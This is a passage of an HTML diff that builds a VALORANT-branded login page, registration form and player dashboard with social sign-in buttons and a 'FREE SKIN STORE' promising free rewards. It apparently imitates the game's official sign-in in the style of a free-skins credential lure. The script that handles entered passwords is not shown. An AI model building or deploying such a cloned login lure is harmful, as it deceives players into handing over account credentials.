+        <input type="password" id="login-password" class="lc-input">
+        <button class="lc-eye" onclick="toggleEye('login-password',this)" tabindex="-1">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div class="lc-socials">
+      <button class="lc-social-btn lc-facebook" title="Facebook">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"/></svg>
+      </button>
+      <button class="lc-social-btn lc-google" title="Google">
+        <svg width="20" height="20" viewBox="0 0 24 24">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+      </button>
+      <button class="lc-social-btn lc-apple" title="Apple">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M16.52 0c.33 2.58-1.35 4.76-3.22 5.04-.28-2.41 1.32-4.72 3.22-5.04zm3.47 17.77c-.73 1.6-1.59 3.06-2.87 3.08-1.25.02-1.65-.74-3.08-.74-1.44 0-1.88.72-3.08.76-1.23.04-2.2-1.56-2.94-3.17-1.52-3.28-1.67-7.12-.52-9.15.82-1.45 2.26-2.37 3.7-2.37 1.26 0 2.07.75 3.12.75 1.02 0 1.64-.76 3.11-.76 1.27 0 2.6.73 3.43 2-.12.07-3.04 1.69-2.87 5.6z"/></svg>
+      </button>
+      <button class="lc-social-btn lc-xbox" title="Xbox">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+          <circle cx="12" cy="12" r="10" fill="#107C10"/>
+          <path fill="white" d="M6.4 7.5c.7-.9 3.6 1.1 5.6 3.5 2-2.4 4.9-4.4 5.6-3.5.8 1-1.2 5.5-5.6 9C7.6 13 5.6 8.5 6.4 7.5z"/>
+        </svg>
+      </button>
+      <button class="lc-social-btn lc-ps" title="PlayStation">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9.5 18.5v-13l1.5-.5v13l-1.5.5zm3 0v-8l1.5-.5v8l-1.5.5zm3-1v-5l1.5-.5v5l-1.5.5zm-9 1l-1.5-.5v-5l1.5.5v5z"/></svg>
+      </button>
+    </div>
+    <label class="lc-stay">
+      <input type="checkbox" id="staySignedIn">
+      <span class="lc-checkbox-custom"></span>
+      <span>Stay signed in</span>
+    </label>
+    <button class="lc-arrow-btn" onclick="doLogin()" id="loginArrowBtn">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.5">
+        <path d="M5 12h14M12 5l7 7-7 7"/>
+      </svg>
+    </button>
+    <div class="lc-bottom-links">
+      <a href="#" class="lc-bottom-link">CAN'T SIGN IN?</a>
+      <a href="#" class="lc-bottom-link lc-create" onclick="showPage('register');return false;">CREATE ACCOUNT</a>
+    </div>
+  </div>
+</div>
+
+<!-- REGISTER PAGE -->
+<div id="register-page" class="hidden-page">
+  <div class="login-bg-scene">
+    <img src="https://images.contentstack.io/v3/assets/bltb6530b271fddd0b1/blt939315f930d8d4e1/66319a877ddbd0dcb1a75d66/VALORANT_Ep8_Act3_KeyArt_3840x2160.jpg" class="login-bg-img" alt="">
+    <div class="login-bg-darken"></div>
+  </div>
+  <div class="login-card">
+    <button class="login-back-x" onclick="showPage('login')">←</button>
+    <h2 class="login-card-title">Create Account</h2>
+    <div id="register-alert" class="login-alert hidden"></div>
+    <div class="lc-field">
+      <label class="lc-label">USERNAME</label>
+      <input type="text" id="reg-username" class="lc-input">
+    </div>
+    <div class="lc-field">
+      <label class="lc-label">EMAIL</label>
+      <input type="email" id="reg-email" class="lc-input">
+    </div>
+    <div class="lc-field">
+      <label class="lc-label">PASSWORD</label>
+      <div class="lc-input-wrap">
+        <input type="password" id="reg-password" class="lc-input">
+        <button class="lc-eye" onclick="toggleEye('reg-password',this)" tabindex="-1">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <div class="pass-strength-wrap">
+        <div class="pass-strength-bar"><div class="pass-strength-fill" id="strengthFill"></div></div>
+        <span class="pass-strength-label" id="strengthLabel">—</span>
+      </div>
+    </div>
+    <div class="lc-field">
+      <label class="lc-label">CONFIRM PASSWORD</label>
+      <input type="password" id="reg-confirm" class="lc-input">
+    </div>
+    <label class="lc-stay" style="margin-bottom:20px">
+      <input type="checkbox" id="reg-terms">
+      <span class="lc-checkbox-custom"></span>
+      <span>I agree to the <a href="#" style="color:#ff4655">Terms</a> and <a href="#" style="color:#ff4655">Privacy Policy</a></span>
+    </label>
+    <button class="lc-arrow-btn" onclick="doRegister()" id="registerArrowBtn">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2.5">
+        <path d="M5 12h14M12 5l7 7-7 7"/>
+      </svg>
+    </button>
+    <div class="lc-bottom-links">
+      <a href="#" class="lc-bottom-link" onclick="showPage('login');return false;">BACK TO SIGN IN</a>
+    </div>
+  </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard-page" class="hidden-page">
+  <div class="dashboard-wrap">
+    <nav class="dash-nav" id="navbar">
+      <div class="nav-logo">
+        <svg viewBox="0 0 60 80" fill="none" width="22" height="28">
+          <path d="M0 0 L30 60 L60 0 L48 0 L30 36 L12 0Z" fill="#ff4655"/>
+        </svg>
+        <span>VALORANT</span>
+      </div>
+      <div class="nav-links">
+        <a href="#" onclick="showDash('overview')" class="dash-nav-link active" id="dlink-overview">OVERVIEW</a>
+        <a href="#" onclick="showDash('store')" class="dash-nav-link" id="dlink-store">FREE STORE</a>
+        <a href="#" onclick="showDash('stats')" class="dash-nav-link" id="dlink-stats">MY STATS</a>
+      </div>
+      <div class="nav-right">
+        <div class="dash-avatar-wrap">
+          <div class="dash-avatar" id="dashAvatar">V</div>
+          <div class="dash-user-meta">
+            <span class="dash-uname" id="dashUname">AGENT</span>
+          
+          </div>
+        </div>
+        <button class="nav-signin" onclick="doLogout()">LOGOUT</button>
+      </div>
+    </nav>
+
+    <!-- OVERVIEW -->
+    <div class="dash-section" id="dsec-overview">
+      <div class="dash-hero-band">
+        <div class="dhb-bg"></div>
+        <div class="dhb-content">
+          <p class="dhb-eyebrow">WELCOME BACK, AGENT</p>
+          <h1 class="dhb-name" id="dashHeroName">—</h1>
+          <p class="dhb-sub">Your daily login rewards are ready!</p>
+          <button class="btn-primary" onclick="showDash('store')">CLAIM FREE REWARDS</button>
+        </div>
+        <div class="dhb-art">
+          <svg viewBox="0 0 60 80" fill="none" style="width:120px;height:160px;opacity:.12">
+            <path d="M0 0 L30 60 L60 0 L48 0 L30 36 L12 0Z" fill="white"/>
+          </svg>
+        </div>
+      </div>
+      <div class="dash-cards-row">
+        <div class="dash-card"><span class="dc-icon">🎯</span><div><span class="dc-label">RANK</span><span class="dc-val" id="dcRank">—</span></div></div>
+        <div class="dash-card"><span class="dc-icon">🏆</span><div><span class="dc-label">WINS</span><span class="dc-val" id="dcWins">0</span></div></div>
+        <div class="dash-card"><span class="dc-icon">💰</span><div><span class="dc-label">VP BALANCE</span><span class="dc-val" id="dcVP">0</span></div></div>
+        <div class="dash-card"><span class="dc-icon">💎</span><div><span class="dc-label">SKINS</span><span class="dc-val" id="dcSkins">0</span></div></div>
+        <div class="dash-card"><span class="dc-icon">🔥</span><div><span class="dc-label">STREAK</span><span class="dc-val" id="dcStreak">1D</span></div></div>
+      </div>
+      <div class="dash-block">
+        <h3 class="dash-block-title">RECENT MATCHES</h3>
+        <div id="matchHistory" class="match-list"></div>
+      </div>
+    </div>
+
+    <!-- FREE STORE -->
+    <div class="dash-section hidden" id="dsec-store">
+      <div class="dash-store-header">
+        <h2>FREE SKIN STORE</h2>
+        <p>Claim these skins for free. Rotates every 24 hours.</p>
+      </div>
+      <div class="dash-store-grid" id="dashStoreGrid"></div>
+    </div>
+
+    <!-- STATS -->
+    <div class="dash-section hidden" id="dsec-stats">
+      <div class="dash-store-header">
+        <h2>PLAYER STATS</h2>
+        <p>Your performance overview</p>
+      </div>
+      <div class="stats-quad">
+        <div class="sq-card"><div class="sq-num" id="sqKD">—</div><div class="sq-label">K/D RATIO</div></div>
+        <div class="sq-card"><div class="sq-num" id="sqHS">—%</div><div class="sq-label">HEADSHOT %</div></div>
+        <div class="sq-card"><div class="sq-num" id="sqWR">—%</div><div class="sq-label">WIN RATE</div></div>
+        <div class="sq-card"><div class="sq-num" id="sqACS">—</div><div class="sq-label">AVG SCORE</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script src="app.js"></script>
+</body>
+</html>
